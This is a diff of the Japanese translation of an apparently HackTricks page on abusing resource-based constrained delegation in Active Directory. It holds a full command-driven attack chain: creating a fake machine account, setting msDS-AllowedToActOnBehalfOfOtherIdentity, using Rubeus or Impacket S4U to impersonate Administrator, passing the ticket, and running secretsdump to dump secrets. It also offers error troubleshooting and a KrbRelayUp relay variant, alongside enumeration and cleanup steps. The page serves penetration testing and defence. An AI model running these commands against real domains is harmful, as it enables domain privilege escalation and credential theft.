@@ -3,36 +3,35 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## Basics of Resource-based Constrained Delegation
+## Resource-based Constrained Delegation の基本
 
-これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**代わりに** **オブジェクト** に **ユーザーを機械に対して偽装する権限を与えるのではなく**、リソースベースの制約付き委任は **そのオブジェクトに対して偽装できるユーザーを設定します**。
+これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**オブジェクト**に**あるマシンに対して任意のユーザーをなりすます権限**を与える代わりに、Resource-based Constrain Delegation は**そのオブジェクトに対して誰が任意のユーザーをなりすませるかを設定します**。
 
-この場合、制約されたオブジェクトには、他のユーザーを偽装できるユーザーの名前を持つ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性があります。
+この場合、制約されたオブジェクトは _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性を持ち、その値にそのオブジェクトに対して任意のユーザーをなりすますことができるユーザーの名前が入ります。
 
-この制約付き委任と他の委任との重要な違いは、**マシンアカウントに対する書き込み権限** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できることです（他の委任の形式ではドメイン管理者の特権が必要でした）。
+この Constrained Delegation と他の delegation とのもう一つの重要な違いは、マシンアカウントに対する **write permissions** （_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）を持つ任意のユーザーが **_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できる点です（他の形式の Delegation ではドメイン管理者権限が必要でした）。
 
-### New Concepts
+### 新しい概念
 
-制約付き委任では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要であると述べられていました。しかし、それは完全に真実ではありません。\
-実際には、その値がなくても、**サービス**（SPNを持つ）であれば任意のユーザーに対して **S4U2Self** を実行できますが、**`TrustedToAuthForDelegation`** を持っている場合、返される TGS は **Forwardable** になります。そして、そのフラグを持っていない場合、返される TGS は **Forwardable** ではありません。
+Constrained Delegation の説明では、ユーザーの _userAccountControl_ 値内の **`TrustedToAuthForDelegation`** フラグが **S4U2Self** を実行するために必要だとされていました。しかしそれは完全に正しくありません。実際には、その値がなくても、あなたが **service**（SPN を持つ）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、**`TrustedToAuthForDelegation`** を**持っている**場合に返される TGS は **Forwardable** になり、持っていない場合は返される TGS は **Forwardable** にはなりません。
 
-ただし、**S4U2Proxy** で使用される **TGS** が **Forwardable でない** 場合、基本的な制約付き委任を悪用しようとしても **機能しません**。しかし、リソースベースの制約付き委任を悪用しようとしている場合は、**機能します**。
+しかし、**S4U2Proxy** で使用される **TGS** が **NOT Forwardable** の場合、基本的な Constrain Delegation を悪用しようとしてもうまくいきません。しかし Resource-Based constrain delegation を悪用する場合は動作します。
 
-### Attack structure
+### 攻撃の流れ
 
-> **コンピュータ** アカウントに対して **書き込み同等の特権** を持っている場合、そのマシンで **特権アクセス** を取得できます。
+> もし**Computer**アカウントに対して**write equivalent privileges**を持っていれば、そのマシン上で**特権的アクセス**を取得できます。
 
-攻撃者がすでに **被害者コンピュータに対する書き込み同等の特権** を持っていると仮定します。
+攻撃者が既に **victim computer** に対して **write equivalent privileges** を持っていると仮定します。
 
-1. 攻撃者は **SPN** を持つアカウントを **侵害** するか、**作成します**（“Service A”）。注意すべきは、**特別な特権を持たない** _Admin User_ は最大10個のコンピュータオブジェクト（**_MachineAccountQuota_**）を **作成** し、**SPN** を設定できることです。したがって、攻撃者はコンピュータオブジェクトを作成し、SPNを設定することができます。
-2. 攻撃者は被害者コンピュータ（ServiceB）に対する **書き込み権限** を悪用して、**リソースベースの制約付き委任を構成し、ServiceAがその被害者コンピュータ（ServiceB）に対して任意のユーザーを偽装できるようにします**。
-3. 攻撃者は Rubeus を使用して、**特権アクセスを持つユーザー**のために Service A から Service B への **完全な S4U 攻撃**（S4U2Self と S4U2Proxy）を実行します。
-1. S4U2Self（侵害または作成されたアカウントの SPN から）：**私に対する Administrator の TGS を要求します**（Forwardable ではありません）。
-2. S4U2Proxy：前のステップの **Forwardable でない TGS** を使用して、**被害者ホスト**への **Administrator** の **TGS** を要求します。
-3. Forwardable でない TGS を使用している場合でも、リソースベースの制約付き委任を悪用しているため、**機能します**。
-4. 攻撃者は **パス・ザ・チケット** を行い、ユーザーを **偽装して被害者 ServiceB へのアクセスを得る** ことができます。
+1. 攻撃者は **SPN** を持つアカウントを**侵害**するか、**作成**します（“Service A”）。追加の特権がない **_Admin User_** であっても最大 10 個まで Computer objects（**_MachineAccountQuota_**）を作成して SPN を設定できる点に注意してください。したがって攻撃者は単に Computer オブジェクトを作成して SPN を設定できます。
+2. 攻撃者は被害者のコンピュータ（ServiceB）に対する WRITE 権限を**悪用し**、ServiceA がその被害者コンピュータ（ServiceB）に対して任意のユーザーをなりすますことを許可するように **resource-based constrained delegation** を構成します。
+3. 攻撃者は Rubeus を使用して Service A から Service B への **full S4U attack**（S4U2Self と S4U2Proxy）を、Service B への特権アクセスを持つユーザーに対して実行します。
+1. S4U2Self（SPN を侵害／作成したアカウントから）：**TGS of Administrator to me**（Not Forwardable）を要求します。
+2. S4U2Proxy：前のステップで得た **not Forwardable TGS** を使って、**Administrator** から **victim host** への **TGS** を要求します。
+3. not Forwardable な TGS を使用していても、Resource-based constrained delegation を悪用しているため動作します。
+4. 攻撃者は **pass-the-ticket** を行い、ユーザーを **impersonate** して **victim ServiceB** へのアクセスを取得できます。
 
-ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用できます：
+ドメインの _**MachineAccountQuota**_ を確認するには以下を使用できます：
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
@@ -40,7 +39,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### コンピュータオブジェクトの作成
 
-**[powermad](https://github.com/Kevin-Robertson/Powermad)** を使用して、ドメイン内にコンピュータオブジェクトを作成できます:
+ドメイン内にコンピュータオブジェクトを作成するには、**[powermad](https://github.com/Kevin-Robertson/Powermad):** を使用できます。
 ```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -48,14 +47,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### リソースベースの制約付き委任の構成
+### Resource-based Constrained Delegation の構成
 
-**activedirectory PowerShell モジュールを使用**
+**activedirectory PowerShell module を使用**
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-**PowerViewの使用**
+**powerview を使用する**
 ```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -70,27 +69,27 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### 完全なS4U攻撃の実行 (Windows/Rubeus)
+### Performing a complete S4U attack (Windows/Rubeus)
 
-まず最初に、パスワード`123456`で新しいコンピュータオブジェクトを作成したので、そのパスワードのハッシュが必要です:
+まず、新しい Computer オブジェクトをパスワード `123456` で作成したので、そのパスワードのハッシュが必要です:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-これにより、そのアカウントのRC4およびAESハッシュが印刷されます。\
-次に、攻撃を実行できます：
+これにより、そのアカウントのRC4およびAESハッシュが出力されます。  
+これでattackを実行できます:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Rubeusの`/altservice`パラメータを使用すると、一度のリクエストでより多くのサービスのチケットを生成できます:
+Rubeus の `/altservice` パラメータを使えば、一度の要求で複数のサービスのチケットを生成できます:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> ユーザーには「**委任できない**」という属性があります。この属性がTrueの場合、そのユーザーを偽装することはできません。このプロパティはbloodhound内で確認できます。
+> ユーザーには "**Cannot be delegated**" という属性がある点に注意してください。もしその属性が True に設定されているユーザーがいれば、そのユーザーをインパーソネートすることはできません。このプロパティは bloodhound 内で確認できます。
 
-### Linuxツール: Impacketを使用したエンドツーエンドRBCD (2024+)
+### Linux 環境: エンドツーエンドの RBCD を Impacket で実行する (2024+)
 
-Linuxから操作する場合、公式のImpacketツールを使用して完全なRBCDチェーンを実行できます:
+Linux から操作する場合、公式の Impacket ツールを使ってフルな RBCD チェーンを実行できます:
 ```bash
 # 1) Create attacker-controlled machine account (respects MachineAccountQuota)
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
@@ -107,27 +106,27 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 # Example: dump local secrets via Kerberos (no NTLM)
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
-ノート
-- LDAP署名/LDAPSが強制されている場合は、`impacket-rbcd -use-ldaps ...`を使用してください。
-- AESキーを優先してください。多くの現代のドメインはRC4を制限しています。ImpacketとRubeusはどちらもAES専用のフローをサポートしています。
-- Impacketは一部のツールのために`sname`（"AnySPN"）を書き換えることができますが、可能な限り正しいSPNを取得してください（例：CIFS/LDAP/HTTP/HOST/MSSQLSvc）。
+注意
+- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用してください。
+- AES keys を優先してください。多くの最新のドメインは RC4 を制限しています。Impacket と Rubeus はどちらも AES のみのフローをサポートします。
+- Impacket は一部のツール向けに `sname` ("AnySPN") を書き換えることがありますが、可能な限り正しい SPN（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）を取得してください。
 
 ### アクセス
 
-最後のコマンドラインは**完全なS4U攻撃を実行し、管理者から被害者ホストにTGSを**メモリ内に**注入します。\
-この例では、管理者から**CIFS**サービスのTGSが要求されたため、**C$**にアクセスできるようになります。
+最後のコマンドラインは **complete S4U attack and will inject the TGS** を実行し、Administrator から被害ホストへ **memory** に注入します。\
+この例では Administrator から **CIFS** サービスの TGS が要求されたため、**C$** にアクセスできるようになります:
 ```bash
 ls \\victim.domain.local\C$
 ```
-### 異なるサービスチケットの悪用
+### 異なる service tickets の悪用
 
-[**利用可能なサービスチケットについてはこちら**](silver-ticket.md#available-services)を学びましょう。
+Learn about the [**available service tickets here**](silver-ticket.md#available-services).
 
-## 列挙、監査、およびクリーンアップ
+## 列挙、監査、クリーンアップ
 
-### RBCDが構成されたコンピュータの列挙
+### RBCD が構成されたコンピューターの列挙
 
-PowerShell（SIDを解決するためにSDをデコードする）：
+PowerShell (SD をデコードして SID を解決):
 ```powershell
 # List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
 Import-Module ActiveDirectory
@@ -143,20 +142,20 @@ try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $n
 }
 }
 ```
-Impacket（1つのコマンドで読み取りまたはフラッシュ）：
+Impacket (read または flush を 1 コマンドで実行):
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
-### Cleanup / reset RBCD
+### クリーンアップ / リセット RBCD
 
-- PowerShell (属性をクリアする):
+- PowerShell (属性をクリア):
 ```powershell
 Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
 # Or using the friendly property
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
 ```
-- インパケット:
+- Impacket:
 ```bash
 # Remove a specific principal from the SD
 impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
@@ -165,28 +164,32 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 ```
 ## Kerberos Errors
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、kerberosがDESまたはRC4を使用しないように設定されており、RC4ハッシュのみを提供していることを意味します。Rubeusに少なくともAES256ハッシュ（またはRC4、AES128、AES256ハッシュをすべて提供）を供給してください。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: これは、現在のコンピュータの時間がDCの時間と異なり、kerberosが正しく機能していないことを意味します。
-- **`preauth_failed`**: これは、指定されたユーザー名 + ハッシュがログインに機能していないことを意味します。ハッシュを生成する際にユーザー名の中に「$」を入れるのを忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
-- **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります：
-  - 偽装しようとしているユーザーが希望するサービスにアクセスできない（偽装できないか、十分な権限がないため）
-  - 要求されたサービスが存在しない（winrmのチケットを要求したが、winrmが実行されていない場合）
-  - 作成されたfakecomputerが脆弱なサーバーに対する権限を失っており、それを戻す必要がある。
-  - クラシックKCDを悪用している；RBCDは非転送可能なS4U2Selfチケットで機能することを思い出してくださいが、KCDは転送可能である必要があります。
+- **`KDC_ERR_ETYPE_NOTSUPP`**: これは kerberos が DES や RC4 を使用しないように構成されており、あなたが RC4 ハッシュしか渡していないことを意味します。Rubeus に最低でも AES256 ハッシュを渡すか（または rc4、aes128、aes256 のハッシュをすべて渡してください）。Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`**: これは現在のコンピュータの時刻が DC の時刻と異なり、kerberos が正しく動作していないことを意味します。
+- **`preauth_failed`**: これは指定したユーザー名＋ハッシュではログインできないことを意味します。ハッシュ生成時にユーザー名に `$` を付け忘れている可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
+- **`KDC_ERR_BADOPTION`**: これは以下を意味する可能性があります:
+- あなたがインパーソネートしようとしているユーザーが目的のサービスにアクセスできない（インパーソネートできないか、十分な権限がないため）
+- 要求したサービスが存在しない（例: winrm のチケットを要求したが winrm が稼働していない場合）
+- 作成した fakecomputer が脆弱なサーバーに対する権限を失っており、それらの権限を戻す必要がある
+- 古典的な KCD を悪用している可能性がある。RBCD は non-forwardable S4U2Self チケットで動作するのに対し、KCD は forwardable を必要とすることを忘れないでください。
 
 ## Notes, relays and alternatives
 
-- LDAPがフィルタリングされている場合、AD Web Services (ADWS) 上にRBCD SDを書き込むこともできます。参照してください：
+- LDAP がフィルタリングされている場合、AD Web Services (ADWS) を介して RBCD SD を書き込むこともできます。See:
+
 
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Kerberosリレーのチェーンは、1ステップでローカルSYSTEMを達成するためにRBCDで終わることがよくあります。実用的なエンドツーエンドの例を参照してください：
+- Kerberos relay チェーンは、ローカル SYSTEM を一段で取得するために RBCD で終了することが多いです。実践的なエンドツーエンドの例を参照:
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
+
+- LDAP signing/channel binding が **disabled** で、かつ機械アカウントを作成できる場合、**KrbRelayUp** のようなツールは強制された Kerberos 認証を LDAP にリレーし、ターゲットの computer オブジェクトに対して機械アカウントの `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、オフホストから S4U を使って直ちに **Administrator** をインパーソネートできます。
 
 ## References
 
@@ -195,7 +198,9 @@ adws-enumeration.md
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-- Impacket rbcd.py (公式): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
-- 最近の構文を含むクイックLinuxチートシート: https://tldrbins.github.io/rbcd/
+- Impacket rbcd.py（公式）: https://github.com/fortra/impacket/blob/master/examples/rbcd.py
+- 最近の構文を含む簡単な Linux チートシート: https://tldrbins.github.io/rbcd/
+- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
+
 
 {{#include ../../banners/hacktricks-training.md}}
